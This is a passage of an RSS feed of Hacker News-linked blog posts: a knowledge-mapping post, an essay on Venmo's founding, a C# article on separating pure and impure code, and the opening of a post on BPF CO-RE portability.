</blockquote>
<h2 id="theres-hope">There's Hope</h2>
<p>The open-source community is a fantastic example of people working asynchronously together and
having colossal impact in our lives.</p>
<p>A laughably simple algo to keep learning could be:</p>
<ol>
<li>Map your knowledge in a graph format</li>
<li>Keep notes / annotate your readings publicly</li>
<li>Pick another branch from the tree</li>
<li>Go to step 2</li>
</ol>
<p>Remember, there's nothing embarrassing in admitting you don't know
something, it's empowering and the first step to master any subject.</p>
<p>What about the cover image of this post?
Well, I couldn't help it and wrote some code to support it.</p>

<p>Khanacademy used to have a <a href="https://khanacademy.fandom.com/wiki/Knowledge_Map">knowledge map</a> feature which I found
inspiring. Browsing a universe of infinite topics, continuing education ftw.</p>
<img src="https://zorbash.com/images/posts/knowledge_map/ka_map.jpg">
<h3 id="building-my-knowledge-map">Building my Knowledge Map</h3>
<p>So, I decided to build my own map and needed to bootstrap it somehow. I
quickly extracted, cleaned and analysed the tags of my Tefter bookmarks.
For the uninitiated, <a href="https://tefter.io/">Tefter</a> is a social bookmarking app I use heavily and I also develop 🤠.</p>
<img src="https://zorbash.com/images/posts/knowledge_map/banner.jpg">
<p>On the graph, tags are nodes and edges connect topics when they appear as tags on the same bookmark.</p>
<p>Is this a real knowledge map? No, it's the minimum viable hack, a
compass to aid me steer towards building the real one.</p>
<p>Feel free to have a look and remix the code of the visualisation on <a href="https://glitch.com/~helpful-kind-beechnut">Glitch</a>.</p>
<p>To make progress I'll attempt to bring order to that
chaotic graph by grouping some topics together. I'm also starting this
book <a href="https://en.wikipedia.org/wiki/Consilience_(book)">“Consilence: The Unity of Knowledge”</a> which might help me with that.</p>
<p>I'll also try to evaluate some apps and methodologies below:</p>
<ul>
<li><a href="https://beepb00p.xyz/promnesia.html">https://beepb00p.xyz/promnesia.html</a></li>
<li><a href="https://foambubble.github.io/foam/">https://foambubble.github.io/foam/</a></li>
<li><a href="https://roamresearch.com/">https://roamresearch.com/</a></li>
<li><a href="https://www.buildingasecondbrain.com/">https://www.buildingasecondbrain.com/</a></li>
<li><a href="https://zettelkasten.de/posts/overview/">https://zettelkasten.de/posts/overview/</a></li>
</ul>
<p>You've reached the end of this post. Please post your thoughts,
feedback and ideas in the comments.</p>
    </section>
    
  </article>
</div></div>]]>
            </description>
            <link>https://zorbash.com/post/knowledge-mapping/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24259529</guid>
            <pubDate>Mon, 24 Aug 2020 11:15:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Origins of Venmo (2014)]]>
            </title>
            <description>
<![CDATA[
Score 50 | Comments 18 (<a href="https://news.ycombinator.com/item?id=24259509">thread link</a>) | @saadalem
<br/>
August 24, 2020 | https://kortina.nyc/essays/origins-of-venmo/ | <a href="https://web.archive.org/web/*/https://kortina.nyc/essays/origins-of-venmo/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
  <p>I often speak about the origins of Venmo in person and finally wrote down the story here to share with our latest intern class that started this week. (You can also watch an excellent video of Iqram speaking about even more of the history of Venmo <a href="https://www.youtube.com/watch?v=aX7JCCCmLJw">here</a>. It’s a good place to pickup the story where this post leaves off.)</p>

<p>My friend Iqram and I started Venmo to solve a very simple problem for ourselves and for our friends: we noticed that we were still using cash and checks to pay each other back and thought this was silly. Everyone should be using PayPal to pay each other back, but no one we knew was. We thought something must be not quite right about the PayPal experience for casual use, and we decided to design something that felt “right,” something that felt consistent with all of the other mobile tools we used to interact with our friends, like SMS, Gmail, Facebook, etc. This is the story of how we got to Venmo.</p>

<h2 id="penn">Penn</h2>

<p>Iqram and I met as randomly paired freshman year roommates at the University of Pennsylvania in 2001. We’ve been great friends ever since.</p>

<figure>
<img src="https://kortina.s3.amazonaws.com/_/git/origins-of-venmo/iqram-kortina-college.png">
<figcaption>Oldest pic I could find of me and Iqram.</figcaption>
</figure>

<p>Iqram studied computer science at Penn. I started in computer science, but found that much of the learning I was doing happened while I was doing homework exercises, and I was getting no additional value out of the University. I couldn’t justify tuition costs when I was only learning by spending time doing programming exercises, and I developed a hypothesis that I would maximize the value of tuition costs by studying the least practical subjects possible, the things I would not get to do after graduation / outside of University, like reading and discussing great books with a group of incredibly smart students and professors (this backfired, btw–liberal arts is very practical stuff!). I eschewed big lectures and things like On Campus Recruiting, and tried to spend as much time possible in seminars and writing workshops. I ended up with majors in Philosophy and Creative Writing and minors in Computer Science and Logic.</p>

<p>I remained interested in building things during this time, however, and always took the opportunity to build websites for various clubs I was in or for friends with bands, etc.</p>

<p>During our senior year, Iqram and I built our first real project together, a college classifieds site called My Campus Post. It was our first taste of all night coding sessions to get a product to market, and we learned a bunch about grassroots marketing and retention challenges that arise from products with seasonal usage.</p>

<figure>
<img src="https://kortina.s3.amazonaws.com/_/git/origins-of-venmo/mycampuspost.png">
<figcaption>My Campus Post marketing paraphernalia.</figcaption>
</figure>

<p>I loved spending all of my time reading philosophy, working on fun side projects, and actively ignoring practical things like interviewing for jobs, but I clearly remember the day when my Mom was in town for graduation and she asked, “What are you doing after you graduate?” I was sitting on the floor of my dorm room, and I remember being very scared about the question, thinking, “I have no idea what I want to do with my life,” but also feeling OK about the short term, eventually answering, “I don’t have to move out of my dorm until 2 weeks after graduation. I’ll figure something out.”</p>

<h2 id="post-grad-door-to-door-sales">Post Grad Door to Door Sales</h2>

<p>Iqram ended up finding a cheap sublet in West Philly, and we spent the summer building websites for restaurants, salons, bars, etc. We went door to door selling, “Hey, you need a website. We’ll build it for $500…. $100? OK, deal.” We learned a lot as we tried to abstract the sites we were building into something modular, and we got a lot of experience pitching and hearing “no.” One “no” that I still regret more than most of the others I have subsequently heard (for much bigger deals) was for this amazing Pakistani restaurant, Kabobeesh, that served a chicken kabob sandwich on fresh naan bread for $3.50: we tried to sell them a site for 100 chicken rolls, but failed to close them.</p>

<figure>
<img src="https://kortina.s3.amazonaws.com/_/git/origins-of-venmo/kabobeesh.png">
<figcaption>Kabobeesh: I recommend the chicken rolls and chicken karahi.</figcaption>
</figure>

<p>Once, we were chatting at a bar about how we might pad our sporadic income with some part time jobs. We noticed the bar was hiring, got two applications, and started filling them out. We spent a few minutes getting through all the basic background stuff, education, personal info, and got to the references section. We didn’t really have past employers to list at the time, so I put Iqram as a reference, and he put me. We were still rooming together at the time, so we had the same street address. We did not get a call back.</p>

<h2 id="swooge-and-philafunk">Swooge and Philafunk</h2>

<p>During this period, we were always also working on startup-y things, like a realtime website analytics tool called Swooge (which now reminds me of Chartbeat + Google Analytics) and a web based music selling platform, Philafunk (it was like iTunes + MySpace).</p>

<figure>
<img src="https://kortina.s3.amazonaws.com/_/git/origins-of-venmo/philafunk.jpg">
<figcaption>Philafunk site and flyer.</figcaption>
</figure>

<p>After working on a few of these, we realized we had a lot to learn about building a successful startup, so we decided to go find one and work there. Many of these projects we worked on were still in my opinion great ideas and solid evidence that execution matters much more than the idea.</p>

<h2 id="iminlikewithyou">iminlikewithyou</h2>

<p>So we found this NYC company, iminlikewithyou.com, that was just getting started out of Y Combinator, and we joined as 2 of the first 3 employees, all engineers starting together the day we moved to NYC. We had a talented team, built a really innovative, immersive web experience, and learned a bunch about doing startups for real. Eventually, the company pivoted from the original flirting-site idea into a casual games company (OMGPOP), and we both left because we weren’t interested in building games.</p>

<figure>
<img src="https://kortina.s3.amazonaws.com/_/git/origins-of-venmo/iminlikewithyou.png">
<figcaption>iminlikewithyou site.</figcaption>
</figure>

<h2 id="ticketleap-and-bitly">Ticketleap and Bit.ly</h2>

<p>Iqram worked at Ticketleap as the VP of Engineering for a few years, and I bounced around and ended up spending a bunch of time working at Betaworks, on Bit.ly.</p>

<p>We both learned a lot during this period, but I looked forward to the time when we would work on a new project together, with more knowledge and experience this time. Over the years, I often brought up this idea, but the timing was never quite right.</p>

<h2 id="exploring-new-product-ideas">Exploring New Product Ideas</h2>

<p>In early 2009, Iqram chatted me mentioning that he was feeling ready to move on from Ticketleap, and I remember thinking, “Great let’s do this.” We began getting together on weekends (he was in Philly and I was in NYC) to hack on different ideas.</p>

<h2 id="yogorino">Yogorino</h2>

<p>We had a friend in Philadelphia who was opening a yogurt shop, and while helping her get up and running technically, we realized how horrible traditional point of sales software was. We prototyped a web based point of sales software that would turn any laptop into a cash register with a $50 USB magtek swiper. As we thought about it more, it seemed like this would present a really challenging distribution problem (we remembered our days of door to door restaurant sales…). Plus, although this was designed to solve a problem for one of our friends, it wasn’t software that we would be using ourselves daily.</p>

<figure>
<img src="https://kortina.s3.amazonaws.com/_/git/origins-of-venmo/cardswiper.png">
<figcaption>Web POS prototype.</figcaption>
</figure>

<h2 id="back-to-music">Back to Music</h2>

<p>Another idea we explored came to us at a local jazz show: we thought, “It would be awesome to be able to download this show by sending a text message to this band right now, and then have an mp3 show up in our email.” This was getting closer to the Venmo concept we ultimately arrived at, and the detailed wireframes we constructed for this definitely informed a lot of the original Venmo service.</p>

<figure>
<img src="https://kortina.s3.amazonaws.com/_/git/origins-of-venmo/rootsbuy.png">
<figcaption>Wireframe for selling music downloads via SMS.</figcaption>
</figure>

<p>This concept even bore the Venmo name. Lots of people ask about the origin of the name. The brainstorming process was one of many we tried and was not important as the requirements. We were exploring the Latin root vendere “sell” and mo for mobile, but purely as a means to get to a name that (1) was short, 5-6 letters, (2) could be a verb, (3) didn’t have a unintuitive spelling, and (4) was cheap. Venmo was available on GoDaddy and met the important criteria, so we grabbed it.</p>

<figure>
<img src="https://kortina.s3.amazonaws.com/_/git/origins-of-venmo/visionslide.png">
<figcaption>A slide from our deck for an SMS music service.</figcaption>
</figure>

<h2 id="discovering-venmo">Discovering Venmo</h2>

<p>One of the weekends we were getting together to work on this idea, Iqram was visiting me in NYC and left his wallet in Philly. I covered him for the whole weekend, and he ended up writing me a check to pay me back. It was annoying for him to have to find a checkbook to do this, and annoying for me to have to go to the bank if I wanted to cash it (I never did). We thought, “Why are we still doing this? We do everything else with our phones. We should definitely be using PayPal to pay each other back. But we don’t, and none of our friends do.”</p>

<p>So we decided, let’s just try to solve this problem, and build a way to pay each other back that feels consistent with all of the other experiences we have in apps we use with our friends.</p>

<p>We got pretty excited about this idea, and thought, “Surely someone else must be doing this.” We found a laptop and started googling, and soon came across Obopay: a way to send money to anyone directly from your cell phone. They had recently raised $70M from Nokia, and we thought, “Uh-oh.” But then we poked around the website and the product and found that there was no feel and it seemed a little clunky and not like something anyone we knew would ever use.</p>

<h2 id="evolution-of-the-note">Evolution of the Note</h2>

<p>We got a prototype working pretty quickly. It worked over SMS, and was dead simple. To send iqram $20, text “iqram 20” to our number (a hacked Google Voice account, because the alternative, Textmarks, required that you prefix every text message with a keyword–this was back in the days before Twilio…). The recipient saw “kortina paid you $20.”</p>

<figure>
<img src="https://kortina.s3.amazonaws.com/_/git/origins-of-venmo/gvhack.png">
<figcaption>Google Voice SMS hack.</figcaption>
</figure>

<p>Right after we got this working we decided we needed to have a note with each payment so we could keep track of what all of these random amounts were for: “iqram 20 for thai lunch at Nooch.”</p>

<p>The interface was SMS, so we immediately thought, of course it would only be natural for the person on the other end to see the message, so we updated …</p></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://kortina.nyc/essays/origins-of-venmo/">https://kortina.nyc/essays/origins-of-venmo/</a></em></p>]]>
            </description>
            <link>https://kortina.nyc/essays/origins-of-venmo/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24259509</guid>
            <pubDate>Mon, 24 Aug 2020 11:11:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Pure-Impure Segregation Principle (When FP Approaches and When They Don't)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24259506">thread link</a>) | @tyrrrz
<br/>
August 24, 2020 | https://tyrrrz.me/blog/pure-impure-segregation-principle | <a href="https://web.archive.org/web/*/https://tyrrrz.me/blog/pure-impure-segregation-principle">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><span>
      <span></span>
  <img alt="cover" title="cover" src="https://tyrrrz.me/static/de25c61baeba0e069446ffe57e9ae3f8/00d43/Cover.png" srcset="https://tyrrrz.me/static/de25c61baeba0e069446ffe57e9ae3f8/72799/Cover.png 320w,
https://tyrrrz.me/static/de25c61baeba0e069446ffe57e9ae3f8/6af66/Cover.png 640w,
https://tyrrrz.me/static/de25c61baeba0e069446ffe57e9ae3f8/00d43/Cover.png 1000w" sizes="(max-width: 1000px) 100vw, 1000px" loading="lazy">
    </span></p>
<p>About two months ago I published an article titled <a href="https://tyrrrz.me/blog/unit-testing-is-overrated">“Unit Testing is Overrated”</a> where I shared my thoughts on how developers place way too much faith in that testing approach and why it often isn’t the best tool for the job. While I didn’t expect that post to do particularly well, in three weeks it managed to get over 100K views and 1000 comments, even despite its controversial nature (or, perhaps, owing to it?).</p>
<p>It was really interesting to follow the discussions that unfolded, given the vast contrast of opinions people seemed to have on the subject. And while most commenters mainly shared their personal experiences, a few have also voiced criticism of the way some arguments were presented.</p>
<p>In particular, one person mentioned that the drawbacks I’ve described, especially those pertaining to abstractions and mocking, are really just a byproduct of object-oriented programming and its inherent flaws. Had my examples been designed with functional principles in mind, many of the outlined problems would never have surfaced.</p>
<p>More specifically, the suggested solution was to refactor the presented class hierarchy by extracting the pure business logic away from the rest of the code. Getting rid of the impure dependency eliminates the need for mocking, which in turn simplifies unit testing.</p>
<p>This exact approach was actually mentioned in later parts of the post as well, albeit in a slightly different context. Although it does make isolated testing easier for that particular snippet of code, it doesn’t actually invalidate the main issues raised by the article.</p>
<p>That said, I also think that the underlying principle of code separation based on purity is very important and often overlooked. When used correctly, it can positively influence software design, providing benefits in terms of readability, portability and, as mentioned, unit testing.</p>
<p>Depending on who you ask, this principle may have different names, such as <a href="https://destroyallsoftware.com/screencasts/catalog/functional-core-imperative-shell">functional core, imperative shell</a>, <a href="https://blog.ploeh.dk/2017/02/02/dependency-rejection">impure-pure-impure sandwich</a>, and some others. And while most developers seem to agree on its value, there’s still some misunderstanding remaining as to how it’s applied beyond simple academic examples.</p>
<p>At the end of the day, just like with any other software development pattern, its usefulness is entirely situational. However, it offers a good mental model for reasoning about non-determinism in code, which is relevant regardless of context.</p>
<p>In this article we will look at what actually makes something pure or impure, why is that important to us, and how we can leverage that knowledge to write better software. I will show examples of where applying this principle lends to better design, as well scenarios where it might not be as helpful.</p>
<p><em>Note: as usual, the code samples in this article are written in C#, but the main ideas apply to any language.</em></p>
<h2>Pure vs impure</h2>
<p>As I’m writing this in 2020, there is no doubt that most readers are already familiar with the concept of purity in programming. Nevertheless, let’s go over it one more time to make sure we are on the same page.</p>
<p>In essence, <em>pure code</em> is code encapsulated within a function, whose <strong>evaluation is influenced only by its parameters</strong> and whose <strong>evaluation influences only its returned value</strong>. In other words, a pure function doesn’t have any implicit arguments, doesn’t depend on or interact with external state, and doesn’t generate any observable <em>side-effects</em>.</p>
<p>Conversely, a function which breaks at least one of those two rules is called <em>impure</em>. To illustrate this, let’s look at a very simple example:</p>
<div data-language="csharp"><pre><code><span>public</span> <span>static</span> <span><span>bool</span></span> <span>IsFoodEdible</span><span>(</span><span>DateTimeOffset</span> expiration<span>)</span> <span>=&gt;</span>
    DateTimeOffset<span>.</span>Now <span>&lt;</span> expiration<span>;</span>

<span>public</span> <span>static</span> <span><span>bool</span></span> <span>IsFoodEdible</span><span>(</span><span>DateTimeOffset</span> expiration<span>,</span> <span>DateTimeOffset</span> instant<span>)</span> <span>=&gt;</span>
    instant <span>&lt;</span> expiration<span>;</span></code></pre></div>
<p>While both versions of the <code>IsFoodEdible</code> function are similar, only one of them is pure. The first overload gets the current time from the system clock, creating an implicit dependency on some external state. In practice, this means that evaluating the function multiple times may very well produce different results even for the same input parameters, which violates the first rule of purity.</p>
<p>The other version takes the current time as an explicit parameter instead and thus does not exhibit that problem. Regardless of whether we call that function now or ten years into the future, the result is guaranteed to always be the same for the same input. In other words, the behavior of the function depends only on the parameters that were passed to it and nothing else.</p>
<p>Because of that, the second function shown in the above example is pure, while the first one isn’t. Additionally, the following variant would be impure as well:</p>
<div data-language="csharp"><pre><code><span>public</span> <span>static</span> <span><span>void</span></span> <span>IsFoodEdible</span><span>(</span><span>DateTimeOffset</span> expiration<span>,</span> <span>DateTimeOffset</span> instant<span>)</span>
<span>{</span>
    <span>if</span> <span>(</span>instant <span>&lt;</span> expiration<span>)</span>
        Console<span>.</span><span>WriteLine</span><span>(</span><span>"It's edible."</span><span>)</span><span>;</span>
    <span>else</span>
        Console<span>.</span><span>WriteLine</span><span>(</span><span>"It's not edible."</span><span>)</span><span>;</span>
<span>}</span></code></pre></div>
<p>In this case, the impurity comes from the fact that this function generates side-effects by interacting with the standard output stream. Since its evaluation influences something other than its returned value, it breaks the second rule we outlined earlier.</p>
<p>As a general rule, <strong>any function that doesn’t return anything</strong> (or whose return value may be ignored) <strong>is guaranteed to be impure</strong>, because a pure function without a return value is inherently useless. Furthermore, if a function executes asynchronously, it’s also a reliable giveaway that a function is impure, since asynchrony naturally comes from I/O operations.</p>
<p>Finally, the function in the following example may seem impure at a first glance too, but actually isn’t:</p>
<div data-language="csharp"><pre><code><span>public</span> <span>static</span> <span><span>bool</span></span> <span>AllFoodEdible</span><span>(</span><span>IReadOnlyList<span>&lt;</span>DateTimeOffset<span>&gt;</span></span> expirations<span>,</span> <span>DateTimeOffset</span> instant<span>)</span>
<span>{</span>
    <span>for</span> <span>(</span><span><span>var</span></span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;</span> expirations<span>.</span>Count<span>;</span> i<span>++</span><span>)</span>
    <span>{</span>
        <span>if</span> <span>(</span>instant <span>&gt;=</span> expirations<span>[</span>i<span>]</span><span>)</span>
            <span>return</span> <span>false</span><span>;</span>
    <span>}</span>

    <span>return</span> <span>true</span><span>;</span>
<span>}</span></code></pre></div>
<p>Seeing as <code>AllFoodEdible</code> mutates the value of <code>i</code> during the course of its execution, one could think that such a function is not pure either. However, because the variable <code>i</code> is encapsulated within a local scope and cannot be accessed from outside, this mutation is not externally observable and, as such, does not make the function impure.</p>
<p>Now, of course it wouldn’t make much sense to classify code based on these seemingly arbitrary traits if purity didn’t provide us with some useful benefits. Indeed, since pure functions are deterministic and have no side-effects, they possess the following intrinsic qualities:</p>
<ul>
<li>Easy to reason about</li>
<li>Can be safely cached</li>
<li>Can be safely parallelized</li>
<li>Testable in isolation</li>
<li>Don’t execute asynchronously</li>
<li>Don’t influence other functions</li>
</ul>
<p>Judging by this list alone, it’s rather clear that pure code is extremely flexible and convenient to work with. In fact, the initial instinct may be that we should optimize our design in such way that we focus exclusively on writing pure code.</p>
<p>Unfortunately, that’s not possible because <strong>purity</strong>, in itself, <strong>is not an indication of quality, but rather of purpose</strong>. Any program will invariably have impure code, as it’s required to handle infrastructural concerns, such as reading user input, persisting data, making changes in the environment, and all the other things that make our software actually useful.</p>
<p>These aspects are dictated by the functional requirements of the software and not so much by its design. That means that we can’t simply eliminate impurities from our code, at least not without also changing how it works.</p>
<p>Having said that, one very important characteristic of <strong>impurity</strong> is that it’s <strong>inherently contagious</strong>. Any function that depends on the execution of an impure function becomes impure as well:</p>
<div data-language="csharp"><pre><code>
<span>public</span> <span>static</span> <span><span>string</span></span> <span>GetId</span><span>(</span><span>)</span> <span>=&gt;</span> Guid<span>.</span><span>NewGuid</span><span>(</span><span>)</span><span>.</span><span>ToString</span><span>(</span><span>)</span><span>;</span>


<span>public</span> <span>static</span> <span><span>string</span></span> <span>GetFilePath</span><span>(</span><span><span>string</span></span> dirPath<span>,</span> <span><span>string</span></span> name<span>)</span> <span>=&gt;</span>
    dirPath <span>+</span> name <span>+</span> <span>GetId</span><span>(</span><span>)</span><span>;</span>


<span>public</span> <span>static</span> <span><span>string</span></span> <span>GetFilePath</span><span>(</span><span><span>string</span></span> dirPath<span>,</span> <span><span>string</span></span> name<span>,</span> <span><span>string</span></span> id<span>)</span> <span>=&gt;</span>
    dirPath <span>+</span> name <span>+</span> id<span>;</span></code></pre></div>
<p>Depending on how the code is structured and how it interacts with non-deterministic and effectful operations, impurities may make up a larger or smaller portion of the whole. That, in turn, is something we can actually control.</p>
<p>In order to reap the most benefit out of pure functions, we need to design software in a way that <strong>limits impure interactions and delays them as much as possible</strong>. Ideally, we should strive to push them as far out as we can, towards the <em>boundaries of the system</em>.</p>
<h2>Flattening the dependency tree</h2>
<p>Although the concept of purity forms the foundation of functional programming, it isn’t given as much thought in the object-oriented world. In fact, the main purpose of object-oriented design is to aggregate related behavior in a single contextual entity, which usually involves state and mutations.</p>
<p>Software written with OOP in mind follows a hierarchical design, where objects are composed together to represent different layers of abstraction in a connected fashion. Any impurities that may exist in those objects are free to spread from child to parent, potentially contaminating the entire dependency tree.</p>
<p>To better understand what that means in practice, let’s revisit an example from my previous article. The idea was to build a simple web API application that calculates user’s sunrise and sunset times based on their IP. This functionality can be modeled using three classes:</p>
<ul>
<li><code>LocationProvider</code> to get a location from an IP address, using a public GeoIP database</li>
<li><code>SolarCalculator</code> to calculate solar times from that location</li>
<li><code>SolarTimesController</code> to expose the result through an HTTP endpoint</li>
</ul>
<div data-language="csharp"><pre><code><span>public</span> <span>class</span> <span>LocationProvider</span>
<span>{</span>
    <span>private</span> <span>readonly</span> <span>HttpClient</span> _httpClient<span>;</span>

    

    <span>public</span> <span>async</span> <span>Task<span>&lt;</span>Location<span>&gt;</span></span> <span>GetLocationAsync</span><span>(</span><span>IPAddress</span> ip<span>)</span>
    <span>{</span>
        
        <span><span>var</span></span> ipFormatted <span>=</span> <span>!</span>ip<span>.</span><span>IsLocal</span><span>(</span><span>)</span>
            <span>?</span> ip<span>.</span><span>MapToIPv4</span><span>(</span><span>)</span><span>.</span><span>ToString</span><span>(</span><span>)</span>
            <span>:</span> <span>""</span><span>;</span>

        
        <span><span>var</span></span> json <span>=</span> <span>await</span> _httpClient<span>.</span><span>GetJsonAsync</span><span>(</span><span><span>$"http://ip-api.com/json/</span><span><span>{</span><span>ipFormatted</span><span>}</span></span><span>"</span></span><span>)</span><span>;</span>

        
        <span><span>var</span></span> latitude <span>=</span> json<span>.</span><span>GetProperty</span><span>(</span><span>"lat"</span><span>)</span><span>.</span><span>GetDouble</span><span>(</span><span>)</span><span>;</span>
        <span><span>var</span></span> longitude <span>=</span> …</code></pre></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://tyrrrz.me/blog/pure-impure-segregation-principle">https://tyrrrz.me/blog/pure-impure-segregation-principle</a></em></p>]]>
            </description>
            <link>https://tyrrrz.me/blog/pure-impure-segregation-principle</link>
            <guid isPermaLink="false">hacker-news-small-sites-24259506</guid>
            <pubDate>Mon, 24 Aug 2020 11:11:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[BPF Portability and CO-Re (Compile Once Run Everywhere)]]>
            </title>
            <description>
<![CDATA[
Score 29 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24259499">thread link</a>) | @nyellin
<br/>
August 24, 2020 | https://facebookmicrosites.github.io/bpf/blog/2020/02/19/bpf-portability-and-co-re.html | <a href="https://web.archive.org/web/*/https://facebookmicrosites.github.io/bpf/blog/2020/02/19/bpf-portability-and-co-re.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><span><p>What does portability mean in BPF context? What are the challenges of writing portable BPF programs that developers need to deal with? This post will describe BPF portability problem and how BPF CO-RE (Compile Once – Run Everywhere) is helping to address this problem.</p>
<!--truncate-->

<h2>BPF: state of the art</h2>
<p>Since the inception of (e)BPF, it’s been a constant priority for the BPF community to simplify BPF application development as much as possible, make it as straightforward and familiar of an experience as it would be for a user-space application. And with the steady progress around BPF programmability, writing BPF programs has never been easier.</p>
<p>Despite these usability improvements, though, one aspect of BPF application development has been neglected (mostly for technical reasons): portability. What does "BPF portability" mean, though? We define <strong>BPF portability</strong> as the ability to write a BPF program that will successfully compile and pass kernel verification, and will work <strong>correctly</strong> across <em>different kernel versions</em> without the need to recompile it for each particular kernel.</p>
<p>This note describes the BPF portability problem and our solution to it: BPF CO-RE (Compile Once – Run Everywhere). First, we’ll look at the BPF portability problem itself, describing why it is a problem and why it’s important to solve it. Then, we will outline high-level components of our solution, BPF CO-RE, and will give a glimpse into the pieces of the puzzle that needed to be put together to make it happen. We’ll conclude with a tutorial of sorts, describing the user-visible API of the BPF CO-RE approach and demonstrating its application with examples.</p>
<h2>The problem of BPF portability</h2>
<p>A BPF program is a piece of user-provided code which is injected straight into a kernel. Once loaded and verified, BPF programs execute in kernel context. These programs operate inside kernel memory space with access to all the internal kernel state available to it. This is extremely powerful and is one of the reasons why BPF technology is successfully used in so many varied applications. However, this powerful capability also creates the BPF portability pains we have today: BPF programs do not control memory layout of a surrounding kernel environment. They have to work with what they get from independently developed, compiled, and deployed kernels.</p>
<p>Additionally, kernel types and data structures are in constant flux. Different kernel versions will have struct fields shuffled around inside a struct, or even moved into a new inner struct. Fields can be renamed or removed, their types changed, either into some trivially-compatible ones or completely different ones. Structs and other types can get renamed, or they can be conditionally compiled out (depending on kernel configuration), or just plain removed between kernel versions.</p>
<p>In other words, things change all the time between kernel releases and yet BPF application developers are expected to cope with this problem somehow. How is it even possible to do anything useful with BPF today considering this ever-changing kernel environment? There are a few reasons for this.</p>
<p>First, not all BPF programs need to look into internal kernel data structures. One example is <code>opensnoop</code> tool, which relies on kprobes/tracepoints to track which processes open which files, and just needs to capture a few syscall arguments to work. As syscall parameters offer a stable ABI, these don’t change between kernel versions and as such portability is not a concern to begin with. Unfortunately, applications like this are quite rare. These types of applications are also typically quite limited in what they can do.</p>
<p>So, additionally, BPF machinery inside kernel provides a limited set of "stable interfaces" that BPF programs can rely on to be stable between kernels. In reality, underlying structures and mechanisms do change, but these BPF-provided stable interfaces abstract such details from user programs.</p>
<p>As one example, for networking applications it is usually enough to look at a limited set of <code>sk_buff</code>'s attributes (and packet data, of course) to be extremely useful and versatile. To that end, BPF verifier provides a stable <strong><code>__sk_buff</code></strong> "view" (notice underscores in front), which shields BPF programs from changing <code>struct sk_buff</code> layout. All the <code>__sk_buff</code> field accesses are transparently rewritten into an actual <code>sk_buff</code> accesses (sometimes quite elaborate ones – doing a bunch of internal pointer chasing before finally fetching requested field). Similar mechanisms are available to a bunch of different BPF program types. They are done as program type-specific BPF contexts understood by BPF verifier. So, if you are developing a BPF program with such context, consider yourself lucky, you can blissfully live in a nice illusion of stability.</p>
<p>But as soon as you need to get a glimpse at any raw internal kernel data (e.g., very commonly a <code>struct task_struct</code> which represents a process/thread and contains a treasure trove of process information), you are on your own. It is commonly the case for tracing, monitoring, and profiling applications, which are a huge class of extremely useful BPF programs.</p>
<p>In such cases, how do you make sure you are not reading garbage data when some kernel added an extra field before the field you thought is, say, at offset 16 from the start of <code>struct task_struct</code>? Suddenly, for that kernel, you'll need to read data from, e.g., offset 24. And the problems don't end there: what if a field got renamed, as was the case with <code>thread_struct</code>'s <code>fs</code> field (useful for accessing thread-local storage), which got renamed to <code>fsbase</code> between 4.6 and 4.7 kernels. Or what if you have to run on two different configurations of a kernel, one of which disabled some specific feature and completely compiled out parts of the struct (a common case for additional accounting fields, which are optional, but extremely useful if present)? All this means that you can no longer compile your BPF program locally using kernel headers of your dev server and distribute it in compiled form to other systems, while expecting it to work and produce correct results. This is because kernel headers for different kernel versions will specify a different memory layout of data your program relies on.</p>
<p>So far, people have been dealing with this problem by relying on <a href="https://github.com/iovisor/bcc/">BCC</a> (BPF Compiler Collection). With BCC, you embed your BPF program C source code into your user-space program (control application) <em>as a plain string</em>. When control application is eventually deployed and executed on target host, BCC invokes its embedded Clang/LLVM, pulls in local kernel headers (which you have to make sure are installed on the system from correct <code>kernel-devel</code> package), and performs compilation on the fly. This will make sure that memory layout that BPF program expects is exactly the same as in the target host's running kernel. If you have to deal with some optional and potentially compiled-out stuff in kernel, you'll just do <code>#ifdef</code>/<code>#else</code> guarding in your source code to accommodate such hazards as renamed fields, different semantics of values, or any optional stuff not available on current configuration. Embedded Clang will happily remove irrelevant parts of your code and will tailor BPF program code to specific kernel.</p>
<p>This sounds great, doesn't it? Not quite so, unfortunately. While this workflow works, it's not without major drawbacks.</p>
<ul>
<li><p>Clang/LLVM combo is a big library, resulting in big fat binaries that need to be distributed with your application.</p></li>
<li><p>Clang/LLVM combo is resource-heavy, so when you are compiling BPF code at start up, you'll use a significant amount of resources, potentially tipping over a carefully balanced production workfload. And vice versa, on a busy host, compiling a small BPF program might take minutes in some cases.</p></li>
<li><p>You are making a big bet that the target system will have kernel headers present, which most of the time is not a problem, but sometimes can cause a lot of headaches. This is also an especially annoying requirement for kernel developers, because they often have to build and deploy custom one-off kernels as part of their development process. And without a custom-built kernel header package, no BCC-based application will work on such kernels, stripping developers of a useful set of tools for debugging and monitoring.</p></li>
<li><p>BPF program testing and development iteration is quite painful as well, as you are going to get even most trivial compilation errors only in runtime, once you recompile and restart your user-space control application. This certainly increases friction and is not helping to iterate fast.</p></li>
</ul>
<p>Overall, while BCC is a great tool, especially for quick prototyping, experimentation, and small tools, it certainly has lots of disadvantages when used for widely deployed production BPF applications.</p>
<p>We are stepping up the game of BPF portability with BPF CO-RE and believe this is a future of BPF program development, especially for complex real-world BPF applications.</p>
<h2>High-level BPF CO-RE mechanics</h2>
<p>BPF CO-RE brings together necessary pieces of functionality and data at all levels of the software stack: kernel, user-space BPF loader library (libbpf), and compiler (Clang) – to make it possible and easy to write BPF programs in a portable manner, handling discrepancies between different kernels within the same pre-compiled BPF program. BPF CO-RE requires a careful integration and cooperation of the following components:</p>
<ul>
<li><p>BTF type information, which allows to capture crucial pieces of information about kernel and BPF program types and code, enabling all the other parts of BPF CO-RE puzzle;</p></li>
